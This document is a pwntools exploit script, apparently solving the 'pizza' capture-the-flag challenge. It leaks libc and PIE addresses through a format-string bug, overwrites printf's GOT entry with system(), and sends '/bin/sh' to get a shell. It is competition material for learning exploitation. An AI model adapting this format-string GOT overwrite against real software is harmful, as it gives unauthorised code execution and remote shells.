from pwn import *
from icecream import ic

exe = ELF("./pizza_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

elf = context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("chall.lac.tf", 31134)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
pie b 0x00000000000013d1
pie b 0x000000000000135b
pie b 0x000000000000139a
c
'''.format(**locals())

def idk(base, replacewith, tobereplaced):
    test = str(hex(replacewith)[2:])
    test2 = int(test[-4:-2], 16)
    test3 = int(test[-6:-4], 16)
    test = int(test[-2:], 16)
    l = [test, test2, test3]
    t = [0, 0, 0]
    sort = sorted(l)
    for i in range(len(sort)):
        for j in range(len(l)):
            if l[j] == sort[i]:
                t[i] = j
    x = "%{0}c%0$hhn%{1}c%0$hhn%{2}c%0$hhn".format(l[t[0]], l[t[1]]-l[t[0]], l[t[2]]-l[t[1]]).encode()
    x += b'a'*(8-(len(x)%8))
    offset = (len(x)//8)+base
    for i in range(2):
        payload = "%{0}c%{3}$hhn%{1}c%{4}$hhn%{2}c%{5}$hhn".format(l[t[0]], l[t[1]]-l[t[0]], l[t[2]]-l[t[1]], offset, offset+1, offset+2).encode()
        payload += b'a'*(8-(len(payload)%8))
        offset = (len(payload)//8)+base
    payload += p64(tobereplaced+t[0])
    payload += p64(tobereplaced+t[1])
    payload += p64(tobereplaced+t[2])
    return payload

def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()

r = start()

def leak(inp):
    sla(b'>',b'12')
    sla(b':', inp)
    sla(b'>',b'0')
    sla(b'>',b'0')
    ru(b'chose:\n')
    return int(rl().strip(),16)

libc.address = libc_base = leak(b'%47$p') - 0x2724a
sla(b'/n):', b'y')
pie_base = leak(b'%49$p') - 0x1189
system = libc.symbols['system']
printfgot = pie_base + 0x4020

sla(b'? (y/n):',b'y')
payload = idk(6, system, printfgot)
sla(b'>',b'12')
ru(b'ping')
sl(payload)
sla(b'>',b'/bin/sh')
sla(b'>',b'0')

i()
